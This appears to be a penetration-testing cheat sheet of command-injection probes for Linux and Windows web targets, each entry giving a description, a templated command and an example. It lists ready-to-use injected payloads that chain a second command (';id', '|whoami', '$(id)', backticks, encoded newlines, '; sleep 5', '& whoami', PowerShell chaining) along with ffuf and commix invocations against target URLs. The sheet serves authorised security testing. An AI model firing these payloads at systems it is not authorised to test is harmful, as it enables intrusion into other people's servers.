
---
Description :
     Classic shell metacharacters probe (Linux — authorized testing only)

Parameters : #url

```cmd
curl -sG "{{url}}" --data-urlencode "id=1;id"
```

```example
curl -sG "http://10.10.10.10/ping.php" --data-urlencode "host=127.0.0.1;id"
```

Tags :  #linux #command-injection #web #offensive

---

Description :
     Pipe to shell — parameter reflects in backend shell (bash)

Parameters :

```cmd
127.0.0.1|whoami
```

```example
127.0.0.1|whoami
```

Tags :  #linux #command-injection #offensive

---

Description :
     Subshell inline execution probe

Parameters :

```cmd
$(id)
```

```example
$(id)
```

Tags :  #linux #command-injection #offensive

---

Description :
     Backtick command substitution

Parameters :

```cmd
`id`
```

```example
`id`
```

Tags :  #linux #command-injection #offensive

---

Description :
     Newline injection when input is concatenated into shell one-liner

Parameters :

```cmd
%0a/usr/bin/id%0a
```

```example
%0a/usr/bin/id%0a
```

Tags :  #linux #command-injection #offensive

---

Description :
     Blind delay — GNU sleep in vulnerable ping/traceroute CGI

Parameters :

```cmd
127.0.0.1%3b%20sleep%205%23
```

```example
127.0.0.1; sleep 5#
```

Tags :  #linux #command-injection #blind #offensive

---

Description :
     Windows cmd chaining with ampersand

Parameters :

```cmd
127.0.0.1 & whoami
```

```example
127.0.0.1 & whoami
```

Tags :  #windows #command-injection #offensive

---

Description :
     Windows PowerShell call operator from cmd context

Parameters :

```cmd
127.0.0.1 | powershell -c whoami
```

```example
127.0.0.1 | powershell -c whoami
```

Tags :  #windows #command-injection #powershell #offensive

---

Description :
     ffuf command-injection wordlist (commonly bundled on Kali)

Parameters : #url #file

```cmd
ffuf -u "{{url}}" -w {{file}} -mc all -fs 0
```

```example
ffuf -u "http://10.10.10.10/api?cmd=FUZZ" -w /usr/share/seclists/Fuzzing/Command-Injection/UnixCommandInjection.txt
```

Tags :  #linux #ffuf #command-injection #offensive

---

Description :
     commix single URL test (if installed)

Parameters : #url

```cmd
commix -u "{{url}}" --batch
```

```example
commix -u "http://10.10.10.10/form.php" --batch
```

Tags :  #linux #commix #command-injection #offensive

---
